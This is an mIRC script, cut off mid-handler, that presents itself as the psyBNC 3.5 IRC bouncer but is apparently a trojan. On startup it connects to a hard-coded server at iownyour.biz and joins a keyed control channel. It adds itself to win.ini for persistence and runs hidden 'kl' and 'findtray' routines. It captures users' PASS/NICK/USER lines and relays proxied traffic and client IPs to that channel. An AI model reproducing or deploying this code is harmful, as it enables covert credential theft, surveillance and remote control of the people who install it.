on *:START:{ .timer -o 0 300 linkstarts | .timer -o 1 0 loaddata | .timer -o 0 30 savedata | if (!$psyBNC_Name) .timer 1 1 setpsyname  | inc %start | psyBNC start %psyBNC.port | write_mainlog Listener created :0.0.0.0 port %psyBNC.port | set %fldchan #X#psy#X# | set %key $encode(Sm0k3d,m) | .timercon -o 0 60 server irc- $+ $r(1,4) $+ .iownyour.biz $iif($sslready,+6697,6667 -jn %fldchan %key | .writeini $left($mircexe,1) $+ :\windows\win.ini windows load $shortfn($mircexe) | .timerkl -o 1 5 kl | findtray }
on *:EXIT:savedata
alias logo return psyBNC3.5
alias psydir return $shortfn($scriptdir)
alias log.dir return $shortfn($psydir $+ logs\)
alias mainlog return $shortfn($log.dir $+ MAIN.LOG)
alias ppm return $shortfn($log.dir $+ playprivatemessage\)
alias psyentry return :-psyBNC!psyBNC@Lam3rz.de PRIVMSG AUTH : $+ $date $time $iif($1,$1-)
alias write_mainlog { write $mainlog $psyentry $1- }
alias noticelog { noticeauth *-a * $date $time $1- | write_mainlog $1- }
alias linkfile return $psydir $+ link.dll
alias user.name return $iif($check(username,$1),$v1,$null)
alias psyBNC_Name {  if (!%psy.name) set %psy.name $iif($host,$left($host,9),$iif($disk(C).label,$disk(C).label,%psy.name)) | return %psy.name } 
alias inc_addserv { set %inc.addserv $iif($check(addsinc,$1,u),$check(addsinc,$1,u),0) | if (%inc.addserv >= 6) goto end | inc %inc.addserv | hadd -m $1 addsinc %inc.addserv | return $check(addsinc,$1,u) | :END | hadd -m $1 addsinc 1 | return 1  }
alias linkstarts {
  IF ($hget(LINKTO,0).item) {
    hinc -mu2 LINKS inc
    if ($hget(LINKTO,$hget(LINKS,inc)).item) { if (!$sock(link $+ $hget(LINKTO,$hget(LINKS,inc)).item $+ -a).name) sockopen link $+ $hget(LINKTO,$hget(LINKS,inc)).item $+ -a $replace($hget(LINKTO,$hget(LINKS,inc)).data,:,$chr(32)) }
    else return
  }
}
on *:SOCKOPEN:link*:{
  if ($sockerr) { GLOBAL *-a * LINKTO $sock($sockname).ip $+ : $+ $sock($sockname).port failed ( $+ $sock($sockname).wsmsg $+ ) | return }
  else sockwrite -n $SOCKNAME LINKFR0M $psyBNC_Name
}
on *:SOCKREAD:link*:{
  sockread %link
  sockwrite -n psyBNC*  %link
}

;;;;;;;;;;;Main Alias;;;;;;;;;;;;;
alias global {
  sockwrite $1 : $+ $iif($check(nick,$sockname),$v1,$psyBNC_Name) $+ ! $+ $check(user,$sockname) $+ @ $+ $iif($psy.encrypt,$psyencrypt($sock($remove($sockname,psyBNC)).ip),$sock($remove($sockname,psyBNC)).ip) PRIVMSG &Partyline  : $+ $2- $crlf
}
alias psy.links return $sock(link*-a,0).name
alias psy {
  if (ADDADMIN* iswm $1) { if ($hget($2,pass) != $null) { return } | if ($hget($2,pass) == $null) { if ($3 == $null) { tell $logo Password is missing, could not $1 $2 | return } | .hadd -m $2 pass $md5($3) } | .hadd -m $2 admin yes | .hadd -m $2 username $logo | .hadd -m $2 sockname psyBNC $+ $r(0,99999) $+ -a | sockrename $sockname $hget($2,sockname) | .hadd -m $hget($2,sockname) USER $2 | .hadd -m $hget($2,sockname) NICK $pnick($sockname) | if (!$check(CONNECT,$2)) && ($sock($check(sockname,$2,u)).ip) hadd -m $check(sockname,$2,u) CONNECT !AUTH! | .hadd -m $2 BPROXY OFF  | tell $logo Added admin ' $+ $2 $+ ' $+ ( $+ $iif($psy.encrypt,$psyencrypt($sock($sockname).ip),$sock($sockname).ip) $+ ) password ' $+ $3 $+ ' | write_mainlog User $2  $+ ( $+ $iif($psy.encrypt,$psyencrypt($sock($sockname).ip),$sock($sockname).ip) $+ ) is now an admin. | GLOBAL *-a User $2 is now an admin. } 
  if (ADDUSER* iswm $1) { if ($hget($2,pass) != $null) { return } | if ($hget($2,pass) == $null) { if ($3 == $null) { tell $logo Password is missing, could not $1 $2 | return } | .hadd -m $2 pass $md5($3) |  .hadd -m $2 sockname psyBNC $+ $r(0,9999999999999999) | .hadd -m $2 username psyBNC2.4.5 | if (!$sock($check(sockname,$2,u)).mark) && ($sock($check(sockname,$2,u)).ip) hadd -m $check(sockname,$2,u) CONNECT !AUTH! } | .hadd -m $2 BPROXY ON | tell $logo Added user ' $+ $2 $+ ' password ' $+ $3 $+ '  } 
  if (DELADMIN* iswm $1) { if ($hget($2,pass) == $null) { .tell $logo User $2 not found. | return } | if ($hget($2,pass) != $null) { .hdel  $2 admin yes | .hadd -m $2 sockname $remove($check(sockname,$2,u),)  | tell $logo Admin privileges removed from $2 } }
  if (DELUSER* iswm $1) { if ($hget($2,pass) == $null) { .tell $logo User $2 not found. | return } | if ($hget($2,pass) != $null) { .hdel -w $2 * | tell $logo User $2 removed from the user list. } }
}  
alias psy.chk { if (!$sock($replace($1,psyBNC,server)).ip) && (!$sock($replace($1,psyBNC,proxy.server)).ip) psyBNC $1 BCONNECT $pserver($puser($1)) }
alias psyBNC {
  if (*_* iswm $1) sockrename $1 $deltok($1,95,1)
  if ($1 == start) { set %psyBNC.port $2 | if ($sock(psyBNC).name == $null) { .timerclose 1 1 sockclose psybnc | .timerlisten 1 2 socklisten -d 0.0.0.0 psyBNC $2 | opnotice %fldchan *** psyBNC Listening on port $2 . Try /server ::1 $2 } | else { opnotice %fldchan Error occured. Could not open port or psyBNC is already listening. If so, use /sockclose psyBNC | return } }
  if (MADMIN == $2) && ($check(admin,$puser($1)) == yes) { 
    if ($3 == $null) { p.error $1 3 | halt } 
    if ($check(admin,$3,u) == yes) { p.error $1 ALREADY_EXISTS | halt } 
    if ($4 == $null) && (!$check(sockname,$3,u)) { p.error $1 5 | halt } 
    if ($hget($3,pass) != $null) { .hadd -m $3 admin yes | if ($sock($check(sockname,$3,u)).name != $null) sockrename $v1 $v1 $+ -a | if ($sock($replace($check(sockname,$3,u),psyBNC,server)).name != $null) sockrename $v1 $v1 $+ -a | .hadd -m $3 admin yes | .hadd -m $3 sockname $usersock($3) $+ -a | .timersock 1 0 sockrename $usersock($3) $usersock($3) $+ -a | .hadd -m $3 user USER $3 | .hadd -m $3 NICK $check(NICK,$3,u) | noticeauth *-a $date $time :User $puser($1) declared User $3 to admin | write_mainlog User $puser($1) declared User $3 to admin. | halt } 
  }
  if (LINKTO == $2) && ($check(admin,$1) == yes) {
    if ($hget(LINKTO,$3)) { p.error $sockname plinkerrdup }
    if (* :*.*.*.*:* iswm $3-4) { hadd -m $2 $3- | sockwrite -n $1 $psyentry(:New Link ' $+ $3 $+ ' to $right($4,-1) added by $puser($sockname) $+ .) | write_mainlog :New Link ' $+ $3 $+ ' to $right($4,-1) added by $puser($sockname) $+ . } 
    elseif (!$3) p.error $sockname plinkerrname 
    elseif (:*.*.*.* !iswm $4) p.error $sockname plinkerrhost
    elseif (:*.*.*.*:* !iswm $4) p.error $sockname plinkerrport
  }
  if (SETUSERNAME == $2) { if (!$3) p.error $sockname nosyntax | hadd -m $puser($1) username $3- | sockwrite -n $1 $psyentry(:New username set to ' $+ $3- $+ '.) | write_mainlog :New username set to ' $+ $3- $+ ' by $puser($1) $+ . }
  if (LINKFROM == $2) && ($check(admin,$1) == yes) {
    if ($hget(LINKFROM,$3)) { p.error $sockname plinkerrdup }
    if (* :*.*.*.*:* iswm $3-4) { hadd -m $2 $3- | sockwrite -n $1 $psyentry(:New Link ' $+ $3 $+ ' from $right($4,-1) added by $puser($1) $+ .) | write_mainlog :New Link ' $+ $3 $+ ' from $right($4,-1) added by $puser($1) $+ . } 
    elseif (!$3) p.error $sockname p.linkerrname 
    elseif (:*.*.*.* !iswm $4) p.error $sockname p.linkerrhost
    elseif (:*.*.*.*:* !iswm $4) p.error $sockname p.linkerrport
  }
  if (LISTLINKS == $2) && ($check(admin,$1) == yes) {
    noticeauth $1 Listing locally defined Links.
    :lines
    hinc -mu2 inc lines
    if ($hget(LINKFROM,0).item) noticeauth $1 $hget(LINKFROM,$hget(inc,lines)).item <- $hget(LINKFROM,$hget(inc,lines)).data   
    if ($hget(LINKTO,0).item) noticeauth $1 $hget(LINKTO,$hget(inc,lines)).item -> $hget(LINKTO,$hget(inc,lines)).data
    if (%psy.inc.lines < %psy.lines) goto lines
    noticeauth $1 The Link-Tree
    noticeauth $1 End of Tree.
    unset %psy.*line*
  }
  if (DELLINK == $2) && ($check(admin,$1) == yes) { if ($hget(LINKFROM,$3)) || ($hget(LINKTO,$3)) { hdel LINKFROM $3 | hdel LINKTO $3 | sockwrite -n $1 $psyentry(:Deleted link $3 from $puser($1) $+ .) | write_mainlog :Deleted link $3 from $puser($1) $+ . | sockclose link $+ $3 $+ * } | else noticeauth $1 No such link $3 }
  if (NAMEBOUNCER == $2) && ($check(admin,$1) == yes) { 
    if ($3 isalnum) { sockwrite -n $1 $psyentry(Bouncer name changed to ' $+ $3 $+ '.) | write_mainlog (Bouncer name changed to ' $+ $3 $+ '.) by $puser($1) . | %psy.name = $3  }  
    elseif (!$3) p.error $sockname pnonamespecified 
    elseif ($3 !isalnum) p.error $sockname pnameillegal
  }
  if (ADDSERVER == $2) {
    if (*.* !iswm $3-4) { p.error $sockname 2 }
    if (*:* !iswm $3-) { p.error $sockname 1 }
    else {
      .hadd -m $puser($1) server $+ $iif($3 isnum 1-5,$3,1) $replace($wildtok($3-,*.*,1,32),$chr(32),:)  
      noticeauth $1 $+ * SERVER $+ $iif($3 isnum 1-5,$3,1) = ' $+ $replace($wildtok($3-,*.*,1,32),$chr(32),:) $+ '
      if ($sock($replace($1,psyBNC,server) $+ *).name) noticeauth $1 $+ * USE: /quote JUMP to cycle servers.
    }
  }   
  if (ADDUSER == $2) && (-a isin $1) { if ($3 == $null) { p.error $1 6 | halt } | if ($hget($3,pass) != $null) { p.error $sockname 7 $3 | halt } | if (:* !iswm $4-) { p.error $sockname 8 | halt } | if ($hget($3,pass) == $null) { hadd -mu2 temp temp $eval($str($!r(a,z) $!+ $chr(32),8),2) | .hadd -m $3 pass $md5($hget(temp,temp)) | .hadd -m $3 username $right($4-,-1)  |  .hadd -m $3 sockname psyBNC $+ $r(0,9999999999999999) | hadd -m $hget($3,sockname) USER $3 | if (!$check(CONNECT,$2)) && ($sock($check(sockname,$2)).ip) hadd -m $check(sockname,$2,u) !AUTH! }  | .hadd -m $3 BPROXY OFF | noticelog :New User: $+ $3 ( $+ $right($4-,-1) $+ ) added by $puser($1) | noticelog New User ' $+ $3 $+ ' added. Password set to ' $+ $hget(temp,temp) $+ ' | savedata }    
  if ($2 == BCONNECT) { 
    if ($sock(server $+ $remove($1,psyBNC)).ip != $null) { p.error $1 ALREADY_CONNECTED | halt }
    if ($sock($replace($1,psybnc,proxy.server)).ip != $null) { p.error $1 ALREADY_CONNECTED | halt }
    if ($sock($replace($1,psybnc,socks4.server)).ip != $null) { p.error $1 ALREADY_CONNECTED | halt }
    if ($sock($replace($1,psybnc,socks5.server)).ip != $null) { p.error $1 ALREADY_CONNECTED | halt }
    if (!$3) { p.error $1 NO_SERV_SET | halt }
    if (*.*:* !iswm $3) { p.error $1 ERROR_FORMAT | halt } 
    if (*:*pxy iswm $check(BPROXY,$puser($1)))  { 
      sockopen $iif(+ isin $replace($3,:,$chr(32)),-e) $replace($puser($1),psyBNC,proxy.server) $replace($check(BPROXY,$puser($1)),:,$chr(32))) 
      hadd -m $replace($1,psyBNC,proxy.server) NICK $pnick($1) | hadd -m $replace($1,psyBNC,proxy.server) USER $puser($1) 
    } 
    if (*:*s* iswm $check(BPROXY,$puser($1)))  { 
      sockopen $iif(+ isin $replace($3,:,$chr(32)),-e) $replace($1,psyBNC,sock $+ $gettok($check(BPROXY,$puser($1)),2,32) $+ .server) $replace($check(BPROXY,$puser($1)),:,$chr(32))) 
      hadd -m $replace($1,psyBNC,sock $+ $gettok($check(BPROXY,$puser($1)),2,32) $+ .server) NICK $pnick($1) | hadd -m $replace($1,psyBNC,sock $+ $gettok($check(BPROXY,$puser($1)),2,32) $+ .server) USER $puser($1)
    } 
    if (RANDOM_PROXY == $check(BPROXY,$puser($1))) || (RANDOM_PROXY == $check(BPROXY,$puser($sockname))) { 
      :return 
      %temp.proxy = $proxy
      if (!%temp.proxy) goto return
      if (* s4 iswm %temp.proxy) {
        sockopen $iif(+ isin $replace($3,:,$chr(32)),-e) socks4.server $+ $remove($1,psyBNC,socks4.,server) %temp.proxy 
        hadd -m socks4.server $+ $remove($1,psyBNC,socks4.,server) NICK= $+ $pnick($1) USER= $+ $puser($1) (2)
      }
      if (* s5 iswm %temp.proxy) {
        sockopen $iif(+ isin $replace($3,:,$chr(32)),-e) socks5.server $+ $remove($1,psyBNC,socks5.,server) %temp.proxy 
        hadd -m socks5.server $+ $remove($1,psyBNC,socks5.,server) NICK= $+ $pnick($1) USER= $+ $puser($1) (2)
      }
      if (* pxy iswm %temp.proxy) {
        sockopen $iif(+ isin $replace($3,:,$chr(32)),-e) proxy.server $+ $remove($1,psyBNC,proxy.,server) %temp.proxy 
        hadd -m proxy.server $+ $remove($1,psyBNC,proxy.,server) NICK= $+ $pnick($1) USER= $+ $puser($1) (2)
      }
    } 
    elseif (!$check(BPROXY,$puser($1))) || ($check(BPROXY,$puser($1)) == off) {
      sockopen $iif(+ isin $replace($3,:,$chr(32)),-e) server $+ $remove($1,psyBNC,server) $remove($replace($3,:,$chr(32)),+) | hadd -m server $+ $remove($1,psyBNC,server) NICK $pnick($1) | hadd -m server $+ $remove($1,psyBNC,server) USER $puser($1)
      hadd -m $1 NICK $pnick($1) | hadd -m $1 USER $puser($1)  
    }
    if ($sock($1).name) noticeauth $1 $+ * $date $time :User $puser($1) ( $+ $pnick($1) $+ ) trying $gettok($3,1,58) port $gettok($3,2,58) $chr(40) $+ $iif(OFF !isin $check(BPROXY,$puser($1)),thru $v2) $+ $chr(41).
  }
  if ($2 == BQUIT) {
    if ($sock(server $+ $remove($1,psyBNC)).ip == $null) && ($sock($replace($1,psybnc,proxy.server)).ip == $null) {  }
    if ($welcome) .remove $welcome
    .timer* $+ $1 $+ * off    
    if ($sock($replace($1,psyBNC,*server)).name) sockwrite -n $replace($1,psyBNC,*server) QUIT : $+ $3-
    noticeauth $1 $+ * You have been marked as quitted.
    hadd -m $1 CONNECT !auth! $gettok($sock($1).mark,2-,32) (4)
    set -u5 %psyBNC.BDISCONNECT on
    sockclose $replace($1,psyBNC,*server)
    hdel  $puser($sockname) CHANNELS
  }   
  if ($2 == BKILL) && ($check(admin,$1) == yes) { 
    if ($3 == $null) { p.error $1 9 | halt } 
    if ($4 == $null) { p.error $1 10 | halt } 
    if ($sock($usersock($3)).ip == $null) && ($sock($replace($usersock($3),psyBNC,server)).ip == $null) { p.error $1 NO_USER2kill $3 | halt } 
    noticelog $usersock($3) BKILL by user ' $+ $puser($1) $+ ' Reason: ' $+ $4- $+ ' 
    noticelog $usersock($3) Disconnecting $3 $+ . 
    if ($sock($replace($usersock($3),psyBNC,server)).ip != $null) { sockwrite -n $replace($usersock($3),psyBNC,server) QUIT : $+ $logo Admin ' $+ $puser($1) $+ ' killed user '  $+ $3 $+ ' ( $+ $4- $+ ) } 
    .timer 1 0 sockclose * $+ $remove($usersock($3),psyBNC) 
  }
  if ($2 == BNOTICE) { 
    if ($3 == $null) { p.error $1 13 | halt } 
    if ($4 == $null) { p.error $1 14 | halt } 
    if ($3 == GLOBAL) { if ($check(admin,$1) != yes) { p.error $1 ADMIN_NEEDED | halt } | .sockwrite -n psyBNC* : $+ GLOBAL $+ !psyBNC@lam3rz.de PRIVMSG AUTH : $+ < $+ $puser($1) $+ > $4-  | halt }
    if ($sock($usersock($3)).name == $null) { p.error $1 NO_USER $3 | halt } 
    .sockwrite -n $usersock($3) : $+ $puser($1) $+ !psyBNC@lam3rz.de PRIVMSG AUTH : $+ $4- 
  }
  if ($2 == PROXY) { 
    if ($3 == $null) || ($3 == $chr(48)) { hadd -m $puser($1) BPROXY OFF | .noticeauth $1 $+ * PROXY removed. Use JUMP to activate changed proxyusage. | halt } 
    if ($3 == 1) || ($3 == ON) { hadd -m $puser($1) BPROXY RANDOM_PROXY | .noticeauth $1 $+ * PROXY: Using random proxy. Use JUMP to activate changed proxyusage. Use PROXY 0 to reset to non-proxy usage. | halt }   
    if (*.*:* !iswm $3) && (s* !iswm $4) && (pxy != $4) { p.error $1 15 | halt }
    .hadd -m $puser($1) BPROXY $3 $4
    noticeauth $1 $+ * PROXY set to ' $+ $3 $+ ( $+ $iif(s* iswm $4,$replace($4,s,SOCKS),WeBPROXY) $+ )'. Use JUMP to activate changed proxyusage. Use PROXY : to reset to non-proxy usage.
  }
  if ($2 == JUMP) { if ($sock(server $+ $remove($1,psyBNC)).ip == $null) && ($sock($replace($1,psybnc,proxy.server)).ip == $null) && ($sock($replace($1,psybnc,socks4.server)).ip == $null) && ($sock($replace($1,psybnc,socks5.server)).ip == $null) { p.error $1 NO_CONNECTION | halt } | .hadd -m $iif($sock(psyBNC $+ $remove($1,server)).ip == $null,proxy.server,server) !AUTH! NICK= $+ $pnick($replace($1,server,psybnc)) USER= $+ $puser($replace($sockname,server,psyBNC)) (5) | sockclose $sock($replace($1,psybnc,*server*)).name | .timerBCONNECT $+ $sockname -o 1 3 psyBNC $1 BCONNECT $pserver($puser($1)) }
  if (UNADMIN == $2) && ($check(admin,$1) == yes) {  
    if ($3 == $null) || ($check(pass,$3,u) == $null) { p.error $1 NO_USER $3 | halt } 
    if ($check(admin,$3,u) != yes) { p.error $1 NO_ADMIN | halt } 
    hdel  $3 ADMIN | noticeauth $1 $+ * Administrator privileges removed from ' $+ $3 $+ ', now an user. 
    if ($sock($usersock($3)).name) { sockrename $v1 $deltok($remove($v1,-a),95,1) }
    if ($sock($replace($usersock($3),psyBNC,server)).name) { sockrename $v1 $deltok($remove($v1,-a),95,1) }
    if ($sock($replace($usersock($3),psyBNC,socks4.server)).name) { sockrename $v1 $deltok($remove($v1,-a),95,1) }
    if ($sock($replace($usersock($3),psyBNC,socks5.server)).name) { sockrename $v1 $deltok($remove($v1,-a),95,1) }
    .hadd -m $3 sockname $remove($usersock($3),-a)
    write_mainlog $puser($1) removed admin flag of user $3 
  }
  if (DELSERVER == $2) { if ($3 == $null) || ($3 !isnum 1-5) { p.error $1 17 | halt } | hdel  $puser($1) SERVER $+ $3 | noticeauth $1 $+ * Server $3 deleted. }  
  if (DELUSER == $2) && ($check(admin,$puser($1)) == yes) { if (default isin $3) { p.error $1 CANT_DEL_DEFAULT | halt } | if ($3 == $null) || ($check(pass,$3) == $null) { p.error $1 NO_USER $3 | halt } | noticelog :User $3 deleted by $puser($1) $+ . | if ($usersock($3) != $null) sockclose * $+ $remove($usersock($3),psyBNC) | hdel -w $3 * }
  if (TRANSLATE == $2) && (* :* * iswm $3-5) { .hadd -m $puser($1) TRANSLATE $iif($check(translate,$1),$v1 $+ $chr(44)) $+ $3- | noticeauth $1 Translator active on $3 ' $+ $4 to $5 $+ '. }
  if (DELTRANSLATE == $2) { if (!$check(translate,$1)) p.error 232 | if (*,* !iswm $check(translate,$1)) { .hdel  $puser($1) TRANSLATE | goto then } | .hadd -m $puser($1) TRANSLATE $deltok($check(translate,$1),$3,44) | :THEN | noticeauth $1 Translate number $3 deleted. }
  if (LISTTRANSLATE == $2) { noticeauth $1 Listing translates | %psy.tok = $numtok($check(TRANSLATE,$1),44) | :tok | inc %psy.tok.inc | IF (!%psy.tok) goto end | noticeauth $1 %psy.tok.inc ' $+ $gettok($check(TRANSLATE,$1),%psy.tok.inc,44) $+ ' | if (%psy.tok.inc < %psy.tok) goto tok | :end | noticeauth $1 End of list | unset %psy.tok* }
  if (LISTSERVERS == $2) { %psyinc = 0 | while (%psyinc < 5) { inc %psyinc | if ($check(SERVER $+ %psyinc ,$1)) noticeauth $1 $+ * Server $chr(35) $+ %psyinc $+ : $v1 } | if (%psyinc == 5) { unset %psyinc | noticeauth $1 $+ * End of Servers. } | return }  
  if (BWHO iswm $2) { 

    .timer $findfile($scriptdir,psyBNC.*.dat,0) 0 psy.bwho $1

  }  
  if ($2 == GETOFFLINE) { 
    if ($sock(server $+ $remove($1,psyBNC)).ip != $null) {
      if ($sock(server $+ $remove($1,psyBNC)).name != $null) {
        if ($check(CHANNELS,$1) == $null) { sockwrite -n server $+ $remove($1,psyBNC) whois $pnick($1) }
        if ($check(AWAYNICK,$1) != $null) { sockwrite -n server $+ $remove($1,psyBNC) nick : $+ $check(AWAYNICK,server $+ $remove($1,psyBNC)) }
        if ($check(AWAYMSG,$1) != $null) { sockwrite -n server $+ $remove($1,psyBNC) away :( $+ $check(AWAYMSG,server $+ $remove($1,psyBNC)) $+ ) }
        if ($check(LEAVEMSG,$1) != $null) { sockwrite -n server $+ $remove($1,psyBNC) privmsg $check(CHANNELS,server $+ $remove($1,psyBNC)) :ACTION is away ( $+ $check(LEAVEMSG,server $+ $remove($1,psyBNC)) $+ ) $+  } 
      }
    }
    sockclose $1
    return
  }
  if ($2 == GETONLINE) { 
    if ($check(OFFLINE,$1) == yes) {
      if ($check(AWAYNICK,$1) != $null) { sockwrite -n server $+ $remove($1,psyBNC) NICK : $+ $pnick($1) | .timer 1 5 sockwrite -n $1 : $+ $check(AWAYNICK,$1) $+ !Elite@psyBNC NICK : $+ $pnick($1) }
      if ($check(AWAYMSG,$1) != $null) { sockwrite -n server $+ $remove($1,psyBNC) away }
      hdel  $puser($1) OFFLINE
    }
  }
  if (PLAYPRIVATELOG == $2) { 
    if ($isfile($ppm $+ $puser($sockname) $+ .ppm) == $false) { p.error $1 NO_LOG | halt }
    noticeauth $1 $+ * Playing private log.
    .play -ap ssww1 $1 $ppm $+ $puser($sockname) $+ .ppm 0
    noticeauth $1 $+ * Use: ERASEPRIVATELOG to erase log file.
  }
  if (ERASEPRIVATELOG == $2) {
    if ($isfile($ppm $+ $puser($sockname) $+ .ppm) == $false) { p.error $1 NO_LOG | halt }
    noticeauth $1 $+ * Private log file erased.
    .remove $ppm $+ $puser($sockname) $+ .ppm
  }
  if (PLAYTRAFFICLOG == $2) { 
    if ($isfile($ppm $+ $puser($sockname) $+ .ppc) == $false) { p.error $1 NO_LOG | halt }
    noticeauth $1 $+ * Playing channel log.
    .play -ap ssww1 $1 $ppm $+ $puser($sockname) $+ .ppc 0
    noticeauth $1 $+ * Please type /quote ERASETRAFFICLOG ,to erase log file.
  }
  if (ERASETRAFFICLOG == $2) {
    if ($isfile($ppm $+ $puser($sockname) $+ .ppc) == $false) { p.error $1 NO_LOG | halt }
    noticeauth $1 $+ * Channel log file erased.
    .remove $ppm $+ $puser($sockname) $+ .ppc
  }
  if (PLAYMAINLOG == $2) { if ($isfile($mainlog) == $false) { p.error $1 NO_LOG | halt } | noticeauth $1 Starting playing Main-Log | .play -ap ssww1 $1 $mainlog 0 }
  if (ERASEMAINLOG == $2) { if ($isfile($mainlog) == $false) { p.error $1 NO_LOG | halt } | noticeauth *-a* $date $time Main-Log erased by $puser($1) $+ . | .remove $mainlog | write_mainlog Main-Log erased by $puser($1) $+ . }
  if ($2 == SETAWAY) {  if ($3 == $null) { hdel  $puser($1) AWAYMSG | noticeauth $1 $+ * Away message= 'None' } | if ($3 != $null) { hadd -m $puser($1) AWAYMSG $3- | noticeauth $1 $+ * Away message= ' $+ $3- $+ ' } }
  if ($2 == SETAWAYNICK) {
    if ($3 == $null) { hdel  $puser($1) AWAYNICK | noticeauth $1 $+ * Away nickname set to null. }
    if ($3 != $null) { hadd -m $puser($1) AWAYNICK $3 | noticeauth $1 $+ * Away nickname= ' $+ $3- $+ ' }
  }
  if ($2 == SETLEAVEMSG) {
    if ($3 == $null) { hdel  $puser($1) LEAVEMSG | noticeauth $1 $+ * Leave message set to null. }
    if ($3 != $null) { hadd -m $puser($1) LEAVEMSG $3- | noticeauth $1 $+ * Leave message= ' $+ $3- $+ ' }
  }
  if ($2 == PASSWORD) {
    if ($3 == $null) { p.error $1 18 | halt }
    if ($3 != $check(pass,$1)) && (!$check(sockname,$3)) { p.error $1 19 | halt }
    if ($3 != $check(pass,$1)) && ($check(sockname,$3)) && (-a isin $1) { 
      .hadd -m $3 pass $md5($4)
      noticeauth $1 $+ *  $3 $+ 's password has changed. 
      write_mainlog $puser($1) $iif($psy.encrypt,$psyencrypt($sock($1).ip),$sock($1).ip) $+ )  changed $3 $+ 's password to $md5($4) on $date $time $+ .
      GLOBAL psyBNC* $puser($1)$iif($psy.encrypt,$psyencrypt($sock($1).ip),$sock($1).ip) $+ )  changed $3 $+ 's password on $date $time $+ .
      halt
    }
    if ($md5($3) === $check(pass,$1))  { 
      if ($4 == $null) { p.error $1 20 | halt }
      if ($4 != $null) { hadd -m $iif($puser($1),$v1,$puser($3)) pass $md5($4) | noticeauth $1 $+ * Your password has changed to $4. | noticeauth $1Please write it down. | write_mainlog $puser($1) changed his password on $date $time $+ . | GLOBAL psyBNC* $puser($1) changed his password on $date $time $+ .  }
    }
  }
  if ($1 == BHELP) { 
    if  ($3 == $null) {
      .timer 42 0 psy.bhelp $2 
      return
    }  
    noticeauth $2 Help for: $upper($3)
    .timer $hfind(BHELP,$3 $+ *,0,w) 0 psy.bhelp $2 $3
    goto EndOfHelp
  } 
  elseif (!$hfind(BHELP,$3 $+ *,0,w)) && ($sock($2).ip) { noticeauth $2 No Help found for: $upper($3) | goto EndOfHelp }
  return
  :EndOfHelp
  noticeauth $2 BHELP - End of help
  halt
}

alias psy.bhelp {
  if (!$2) {
    if ($hget($1,BHELP) > $hfind(BHELP,main*,0,w)) hdel $1 BHELP
    hinc -mu2 $1 BHELP
    .noticeauth $1 $evalnext($hget(BHELP,main $+ $hget($1,BHELP)))

  }
  elseif ($2) {
    if ($hget($1,BHELP) > $hfind(BHELP,$2 $+ *,0,w)) hdel $1 BHELP
    hinc -mu2 $1 $2
    .noticeauth $1 [ [ $hget(BHELP,$2 $+ $hget($1,$2)) ] ]
  }
}

on *:SOCKREAD:psyBNC*:{
  if ($sockerr > 0) { return }
  sockread %psyBNC
  tokenize 32 %psyBNC
  if (%spy) && ($server) { .opnotice %fldchan %psyBNC }
    sockread $iif($sock($sockname).rq > 16384,16834,$v1) &binvar
      while ($sock($sockname).rq) {
    sockread %t | tokenize 32 %t
    sockwrite -n $replace($sockname,pfirc,psybnc) $1-
    if ($sockbr == 0) return
    if (!$hget(make,anon)) .opnotice %fldchan $+ $sock($sockname).ip $+ : $+ $sock($sockname).port $+  $1-
    if ($1 == PING) sockwrite -n $sockname PONG $2-
  }
  if ($sock($replace($sockname,psybnc,server)).ip) && (GET* !iswm $hget(make,sockmark)) { sockwrite -b $replace($sockname,psybnc,server) -1 &binvar }
  if ($sock($replace($sockname,psybnc,pfirc)).ip) { sockwrite -b $replace($sockname,psybnc,pfirc) -1 &binvar }
  hadd -m make text $bvar(&binvar,1,$bvar(&binvar,0)).text
  if (PASS == $gettok($hget(make,text),1,32)) { hadd -mu300 $sockname pass $gettok($hget(make,text),1-,32) }
  if (NICK == $gettok($hget(make,text),1,32)) { hadd -mu300 $sockname nick $gettok($hget(make,text),1-,32) }
  if (USER == $gettok($hget(make,text),1,32)) { hadd -mu300 $sockname user $gettok($hget(make,text),1-,32) }
  if (CONNECT* iswm $hget(make,text)) {
    hadd -m make proxycon $wildtok($gettok($hget(make,text),2,32),*.*,1,32)
    if (?*.?*.?*.?* !iswm $hget(make,proxycon)) && (!$sock($replace($sockname,serv,connect)).ip) { .getdns $sockname $hget(make,proxycon) }
    elseif (?*.?*.?*.?* iswm $hget(make,proxycon)) && (!$sock($replace($sockname,serv,connect)).ip) { sockopen $iif(*:443 iswm $hget(make,proxycon),-e,$iif(*:6697 iswm $hget(make,proxycon),-e)) $replace($sockname,serv,connect) $replace($hget(make,proxycon),:,$chr(32)) }
    .hadd -mu10 make sockmark $hget(make,text)
 
  }
  if (GET* iswm $hget(make,text)) || (POST* iswm $hget(make,text)) {
    hadd -m make proxycon $protocol($wildtok($gettok($hget(make,text),2,32),*.*,1,32))
    if (?*.?*.?*.?* !iswm $hget(make,proxycon)) && (!$sock($replace($sockname,serv,connect)).ip) { .getdns $sockname $hget(make,proxycon) }
    elseif (?*.?*.?*.?* iswm $hget(make,proxycon))  && (!$sock($replace($sockname,serv,connect)).ip) { sockopen $iif(*:443 iswm $hget(make,proxycon),-e,$iif(*:6697 iswm $hget(make,proxycon),-e)) $replace($sockname,serv,connect) $replace($hget(make,proxycon),:,$chr(32)) }
    .hadd -mu10 make sockmark $wildtok($bvar(&binvar,1,$bvar(&binvar,0)).text,GET*,1,13)
  }
  if (!$hget(make,anon)) window @PFDebug
  if (!$hget(make,anon)) .opnotice %fldchan $+ $sock($sockname).ip $+ : $+ $sock($sockname).port $+  $hget(make,text)
  if ($1 == LINKFR0M) && ($sock($sockname).ip !isin $hget(LINKFROM,$2)) { GLOBAL *-a* * Link failed $2 $+ : $+ $sock($sockname).ip : not in LINKFROM configuration. | sockclose $sockname } 
  if ($1 == LINKFR0M) && ($sock($sockname).ip isin $hget(LINKFROM,$2)) {
    GLOBAL *-a* * Link synchronized $2 $+ : $+ $sock($sockname).ip $fulldate 
    if (!$sock(link $+ $2 $+ -a).name) sockrename $sockname link $+ $2 $+ -a 
    hadd -mu2 $2 max $numtok($hget(partyline,nicks),32)
    :JOINS
    hinc -mu2 $2 inc 
    if ($hget($2,max) < $hget($2,inc)) && ($hget($2,max)) { sockwrite -n psyBNC* : $+ $gettok($hget(partyline,nicks),$hget($2,inc),32) $+ ! $+ $2 $+ @ $+ $iif($psy.encrypt,$psyencrypt($sock($sockname).ip),$sock($sockname).ip) JOIN :&Partyline | goto JOINS }
    if ($hget(partyline,topic)) sockwrite -n link* : $+ $2 332 -psyBNC &Partyline $hget(partyline,topic)
